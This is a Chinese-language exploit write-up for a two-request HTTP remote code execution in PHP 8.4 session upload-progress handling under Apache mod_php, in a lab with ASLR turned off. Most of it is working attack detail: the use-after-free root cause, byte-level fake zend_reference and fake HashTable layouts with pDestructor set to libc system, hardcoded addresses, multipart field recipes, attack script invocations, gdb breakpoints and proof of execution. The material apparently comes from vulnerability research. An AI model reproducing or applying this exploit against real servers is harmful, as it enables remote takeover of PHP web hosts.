# 纯 HTTP、无目标侧 PHP 的 no-ASLR RCE 报告

日期：2026-10-21
目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（Debian 12 amd64 远程 lab）
约束：**完全远程、只用 HTTP；不在目标 webroot 写任何特定 PHP 文件**。目标页面为普通
`index.php`：

```php
<?php
echo "OK\n";
```

本报告只覆盖 **no-ASLR** 结果。ASLR 的两条路径分析见 `ASLR_PATHS.md`。

---

## 1. 结论

在关闭 ASLR 的 lab worker 上，已用 **两个纯 HTTP 请求** 打通 RCE：

- 请求 A：`session.upload_progress` 解码大 session 时 OOM，留下跨请求的悬空
  `PS(http_session_vars)` zend_reference。
- 请求 B：multipart 字段分配/释放的 56 字节原始缓冲区重占旧 reference 所在的块，
  把旧的 32 字节 reference 覆盖成伪造的 `zend_reference`；同时用一条**存活的**
  192 字节 zend_string 承载 fake HashTable。B 的 END cleanup 调
  `php_session_track_init()` → `zval_ptr_dtor` → `zend_array_destroy` →
  `zend_hash_destroy`，`pDestructor` 落到 libc `system`。

实测执行：

```text
system("id>/tmp/p1")
```

proof（`/tmp/p1`，54 字节）：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

gdb 关键回溯：

```text
#0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
#1  zend_hash_destroy (ht=0x7ffff5e6e0d8)
#2  zend_array_destroy (ht=0x7ffff5e6e0d8)
#3  i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
#4  zend_reference_destroy (ref=0x7ffff5e02320)
#5  php_session_track_init ()
#6  php_session_initialize ()
#7  php_session_rfc1867_cleanup ()
#8  php_session_rfc1867_callback ()
```

`system` 返回后请求在 Zend MM 中 abort（`zend_mm_realloc_heap` 检测到堆不一致），
但命令已经在 abort 前执行并写出 proof。worker 随后崩溃，符合一次利用的预期。

---

## 2. 根因与触发点

- 漏洞位置：`ext/session/session.c` 的 upload-progress 路径。
- A 请求在 `php_request_startup` 阶段因 `session.upload_progress` 解码大 session
  触发 OOM；bailout 后 `modules_activated=0`，session 的 RSHUTDOWN 被跳过。
- 遗留状态：`PS(http_session_vars)` 是一个 **zend_reference**，其 `val.value`
  指向 A 中分配的 session HashTable；该 reference 在 A 结束后仍被 B 的
  `php_session_track_init()` 访问。
- B 的 END cleanup 调用 `php_session_initialize()` → `php_session_track_init()`：
  1. `zend_delete_global_variable("_SESSION")` 把 reference 的 refcount 从 2 减到 1；
  2. `zval_ptr_dtor(&PS(http_session_vars))` 看到 refcount 1，调用
     `zend_reference_destroy()`；
  3. `zend_reference_destroy()` 对 `ref->val`（我们伪造为 IS_ARRAY）调用
     `zend_array_destroy()`；
  4. fake HashTable 的 `pDestructor = system`，`zend_hash_destroy()` 以
     `&bucket->val`（命令字符串地址）调用 `system()`。

整个触发在应用代码执行前完成，不需要应用调用任何 session API。

---

## 3. 请求 B 的内存布局

no-ASLR 下稳定地址：

| 对象 | 地址/偏移 |
|---|---|
| 旧 zend_reference（悬空）R0 | `0x7ffff5e02320` |
| 重占 R0 的 56B 原始缓冲区起点 | `R0-0x10` |
| fake HashTable 所在 192B zend_string 的 data | `0x7ffff5e6e0d8` (T+0x18) |
| libc `system` | `0x7ffff7d13490` |
| libphp 基址（参考） | `0x7ffff47c0000` |

### 3.1 重占旧 reference 的原始缓冲区

multipart 普通字段的值先由 `multipart_buffer_read_body()` 读入
`erealloc(NULL, len+1)` 的**原始缓冲区**，内容从 offset 0 开始，回调/注册后才
`efree()`；释放后内容仍在。选择字段值长度 55（分配 56B，Zend MM bin 6）。

在 B 中通过 7 个“31 字符字段名 + L=47”的 priming 字段消耗 56B key 槽，使后续
L=55 字段的 raw buffer 正好落在 `0x7ffff5e02310`（R0-0x10）。该块的 56 字节覆盖
旧 32B reference 的 R0 区域：

```text
raw+0x10 (R0+0x00): gc: refcount=1, type=IS_REFERENCE (10)
raw+0x18 (R0+0x08): val.value = fake HashTable data 地址
raw+0x20 (R0+0x10): val.type  = 0x307 (IS_ARRAY_EX)
raw+0x28 (R0+0x18): zend_reference.sources = 0
```

`zend_reference_destroy()` 要求 `sources.ptr == NULL`；否则 release 版
`ZEND_ASSUME` 会导致 `__builtin_unreachable`/abort。

### 3.2 承载 fake HashTable 的存活字符串

不能用已释放的 raw buffer 承载 fake HashTable：释放后 allocator 会把
`next_free_slot` 写到块 offset 0，覆盖 fake HashTable 的 `gc`，导致
`i_zval_ptr_dtor` 的 `GC_DELREF` 不归零，不会进入 array dtor。

改用 **存活的 zend_string**：

- 字段值长度 167 → `zend_string_alloc` 大小 24+167+1=192，正好 bin 13（192B）。
- 字符串保留在 `$_POST` 中，直到 request shutdown；在 B 的 END cleanup 时仍存活。
- 字符串 data 从块起点 +24 开始，内容完全由字段值控制。
- fake HashTable 直接放在 data offset 0：

```text
data+0x00: gc refcount=1, type=IS_ARRAY (7)
data+0x08: flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8
data+0x10: arData = data+0x40
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = system
data+0x40: "id>/tmp/p1\0"
data+0x60: 标记 0x1122334455667788（仅调试用）
```

`zend_hash_destroy()` 走 `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES`
分支，调用 `pDestructor(&p->val)`，即 `system(data+0x40)`。

---

## 4. 复现步骤

环境：

- Apache prefork 单 worker，no-ASLR 启动：
  `setarch $(uname -m) -R /usr/sbin/apache2ctl -k start`
- PHP 配置：`memory_limit=8M`、`session.upload_progress.cleanup=On`、
  `session.upload_progress.enabled=On`、`session.save_path=/tmp`、
  `session.use_strict_mode=0`、`display_errors=On`。
- webroot 只有普通 `index.php`（`echo "OK\n"`，无任何 session 调用）。

请求 A（同目录工具 `send_a_ps.py`）：

```bash
python3 send_a_ps.py 17 19 3 12
# boundary 17B, PHPSESSID 19B, progress key 3B, 大字段 12MB
```

A 的目的：在 upload-progress 解码时 OOM，留下跨请求悬空 reference。
A 结束后 worker 仍可继续处理 B（本 lab 中 session 的 RSHUTDOWN 被跳过）。

请求 B（`send_b_rce2.py`）：

```bash
python3 send_b_rce2.py \
  7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
# N1=7 priming 字段；N2=2 个 L=55 fake-ref 字段
# HTDATA=fake HashTable data 地址；SYS=system 地址
```

B 的 multipart：

- `PHPSESSID=attacksessionid0001`
- `PHP_SESSION_UPLOAD_PROGRESS=pwn`
- 7 × 31 字符字段名（`a000...`），值 = 167B fake HashTable
- 2 × 短字段名（`f00`,`f01`），值 = 55B fake reference
- boundary = `B`×10，末尾正常闭合

检查：

```bash
cat /tmp/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.1 关键 gdb 观察点

```gdb
b php_session_track_init
# 打印 ps_globals.http_session_vars.value.ptr 及其指向的 fake reference
b zend_reference_destroy if $rdi == 0x7ffff5e02320
b zend_array_destroy   if $rdi == 0x7ffff5e6e0d8
b zend_hash_destroy    if $rdi == 0x7ffff5e6e0d8
b system
```

实际命中：

```text
REF rdi=0x7ffff5e02320
ARR T  ht=0x7ffff5e6e0d8
HASH T ht=0x7ffff5e6e0d8
SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
```

---

## 5. 工具与文件

| 文件 | 用途 |
|---|---|
| `tools/send_a_ps.py` | A：upload-progress 大字段 OOM，留下悬空 reference |
| `tools/send_b_align.py` | B 的字段长度/数量对齐实验（找 56B raw buffer 落点） |
| `tools/send_b_rce2.py` | 最终 B：fake reference + 存活字符串 fake HashTable + system |
| `tools/send_b_rce.py` | 早期版本（fake HT 放在已释放 raw buffer，gc 会被 free-list 覆盖，不可用） |
| `logs/noaslr_rce.log` | 成功运行的 gdb/system/proof 记录 |

---

## 6. 限制与边界

1. **仅 no-ASLR**：R0、fake HT data、system 地址均为硬编码。ASLR 打开后地址变化。
2. **memory_limit**：本 lab 用 8M 让 A 容易 OOM。默认 `memory_limit=128M` 时，
   A 需要构造超过 128M 的 session 数据（可行但流量大）；`session.upload_progress`
   默认开启、cleanup 默认 On。
3. **请求 B 后 worker abort**：`system` 返回后 `zend_hash_destroy` 的
   `pefree(HT_GET_DATA_ADDR)` 释放了字符串内部指针，Zend MM 检测到堆不一致并
   abort。proof 已写出；若需要继续利用同一进程，需要把 fake HT 放到可合法释放的
   分配块或修正 nTableMask，使 `HT_GET_DATA_ADDR` 为分配起点。
4. **依赖 B 的精确 56B/192B 分配顺序**：N1=7、字段名长度 31、L=167/L=55、
   boundary 10 是实测组合；换 PHP 构建/配置/请求顺序需重新校准。
5. **不涉及应用代码**：目标页面不需要任何 session 调用；触发在 RINIT/解析阶段。
